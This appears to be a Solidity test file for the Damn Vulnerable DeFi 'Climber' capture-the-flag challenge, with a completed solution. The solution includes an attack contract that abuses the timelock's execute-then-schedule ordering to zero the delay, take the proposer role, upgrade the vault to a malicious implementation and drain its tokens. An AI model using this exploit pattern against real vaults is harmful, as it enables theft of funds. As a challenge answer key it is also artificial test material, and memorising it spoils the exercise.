// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        MaliciousVaultImpl maliciousImpl = new MaliciousVaultImpl();

        ClimberAttack attackContract = new ClimberAttack(
            payable(address(vault)),
            payable(address(timelock)),
            recovery,
            address(token)
        );

        attackContract.attack(address(maliciousImpl));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

contract MaliciousVaultImpl is ClimberVault {
    function sweepFunds(address token, address to) external {
        SafeTransferLib.safeTransfer(token, to, IERC20(token).balanceOf(address(this)));
    }
}

contract ClimberAttack {
    ClimberVault private immutable vault;
    ClimberTimelock private immutable timelock;
    address private immutable recovery;
    address private immutable token;

    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;
    bytes32 private constant SALT = bytes32(0);

    constructor(address payable _vault, address payable _timelock, address _recovery, address _token) {
        vault = ClimberVault(_vault);
        timelock = ClimberTimelock(_timelock);
        recovery = _recovery;
        token = _token;
    }

    function attack(address maliciousImpl) external {
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));

        targets.push(address(timelock));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this))
        );

        targets.push(address(vault));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("upgradeToAndCall(address,bytes)", maliciousImpl, bytes(""))
        );

        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("scheduleAll()"));

        timelock.execute(targets, values, dataElements, SALT);

        MaliciousVaultImpl(address(vault)).sweepFunds(token, recovery);
    }

    function scheduleAll() external {
        timelock.schedule(targets, values, dataElements, SALT);
    }
}
